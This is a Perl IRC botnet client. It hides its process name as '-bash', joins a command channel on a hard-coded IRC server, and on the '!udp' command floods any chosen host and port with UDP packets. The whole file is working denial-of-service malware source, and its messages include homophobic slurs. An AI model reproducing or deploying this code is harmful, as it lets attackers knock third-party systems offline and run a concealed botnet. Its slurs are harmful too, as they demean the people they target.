use strict;
use Socket;
use IO::Socket;

#Commands
#!udp <ip> <port> <time> <packetsize> //Udpfloder
#!quit //Quits bot
#Made by Vypor | Github.com/Vypor
#kawaii-v1.0.0

#Hidden Proccess
$0 = "-bash";

#Server IP or hostname, Channel, Serverpassword (nothing if you dont have one)
my $server      = "vypor.net";
my $channel     = "#bot";
my $maxnamechar = "6";
my $serverpass  = "";

reconnect:
my $nick;
for ( 0 .. $maxnamechar ) { $nick .= chr( int( rand(25) + 65 ) ); }
my $login;
for ( 0 .. $maxnamechar ) { $login .= chr( int( rand(25) + 65 ) ); }

my $sock = new IO::Socket::INET(
    PeerAddr => $server,
    PeerPort => 6667,
    Proto    => 'tcp'
) or goto reconnect and print "fag\n";

if ( $serverpass = !'' ) {
    print $sock "PASS $serverpass\r\n";
}

print $sock "NICK $nick\r\n";
while ( my $input = <$sock> ) {
    if ( $input =~ /433/ ) {
        goto reconnect;
    }
    elsif ( $input =~ /^PING(.*)$/i ) {
        print $sock "PONG $1\r\n";
        print "Connected..!\n";
        print $sock "USER $login 8 * :Perl IRC Hacks Robot\r\n";
        if ( $input =~ /^PING(.*)$/i ) {
            print $sock "PONG $1\r\n";
            print $sock "JOIN $channel\r\n";
        }

        last;
    }
}
while (<$sock>) {
    if ( $_ =~ /^PING(.*)$/i ) {
        print $sock "PONG $1\r\n";
    }
    if ( $_ =~ /^:([^!]*)!(\S*) PRIVMSG (#\S+) :(.*)$/ ) {

        my $user    = $1;
        my $host    = $2;
        my $chnl    = $3;
        my $message = $4;

        my ( $method, $host, $port, $time, $packetsize, $other ) =
          split( / /, $message, 6 );

        if ( $method =~ /^!quit\s*$/ ) {
            quitme($method);
        }
        if ( $method =~ /^!udp\s*$/ ) {
            udp( $host, $port, $time, $packetsize );
        }
        if ( $method =~ /^!hi\s*$/ ) {
            HI();
        }

        sub udp {
            my ( $iaddr, $endtime, $psize, $pport );
	            $iaddr = inet_aton("$host") or print "Cant find host..\n";
        	    $endtime = time() + ( $time ? $time : 1000000 );
            socket( flood, PF_INET, SOCK_DGRAM, 17 );
            	print $sock "PRIVMSG $chnl :Throwing Kittens at: $host for $time seconds\r\n";
            for ( ; time() <= $endtime ; ) {
                	$psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 );
            	    $pport = $port ? $port : int( rand(65500) ) + 1;
                send( flood, pack( "a$psize", "flood" ), 0, pack_sockaddr_in( $pport, $iaddr )
                );
            }
            print $sock "PRIVMSG $chnl :Ran out of kittens...\r\n";
        }

        sub tcp {

            #Put tcp stuff here.

        }

        sub quitme {
            die "Quitting!\n";
        }

        sub HI {
            print $sock "PRIVMSG $chnl :Faggot. faggots say hi..\r\n";
        }

    }
}
sleep 15;
goto reconnect;
